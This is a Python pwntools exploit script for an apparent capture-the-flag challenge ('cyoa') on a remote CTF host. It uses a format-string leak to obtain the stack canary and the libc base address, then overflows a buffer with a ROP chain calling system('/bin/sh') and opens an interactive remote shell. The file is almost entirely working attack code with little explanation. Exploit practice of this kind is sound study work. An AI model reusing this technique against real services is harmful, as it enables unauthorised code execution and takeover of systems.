#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['konsole', '-e']

DEBUG = False
if DEBUG:
    libc = ELF('/lib/libc.so.6')
    libc_leak_offset = 0x1d8a43
    target = gdb.debug('../../challs/cyoa/cyoa','''
    break do_gun
    conti''')
else:
    libc = ELF('./libc.so.6')
    libc_leak_offset = 0x1f6b03
    #target = remote('127.0.0.1', 9999)
    target = remote('binarytohack.thsctf.site', 29848)

target.sendlineafter(b'> ', b'4')
target.sendlineafter(b'> ', b'%19p' * (0x80//4 - 1))

leak_line = target.recvline(keepends=False).decode()
leaks = leak_line.split()
print(leaks)

LEAK_BUF_START = 5

# b'%19p%19p' should be aligned like that on stack
# 0xe instead of 0xf, because not full buffer is used
assert(leaks[LEAK_BUF_START] == '0x7039312570393125')
assert(leaks[LEAK_BUF_START + 0xe] == '0x7039312570393125')

canary = int(leaks[LEAK_BUF_START + 0x10 + 1], 0x10)
log.info(f'{hex(canary)=}')

libc_base = int(leaks[0], 0x10) - libc_leak_offset
log.info(f'{hex(libc_base)=}')

libc.address = libc_base

rop = ROP(libc)

bin_sh_addr = next(libc.search(b'/bin/sh'))

rop.system(bin_sh_addr)

log.info(rop.dump())

target.sendlineafter(b'> ', b'6')

rw_addr = libc_base - 0x800
target.sendlineafter(b'> ', p64(0x1122334455667788) * (0x20//8) + p64(0x1234) + # padding
                     p64(canary) +
                     p64(rw_addr) + # saved rbp, has to be rw section (here using area below libc, let's hope nothing breaks)
                     p64(rop.ret.address) + # ensure propper stack alignment
                     bytes(rop))

target.interactive()
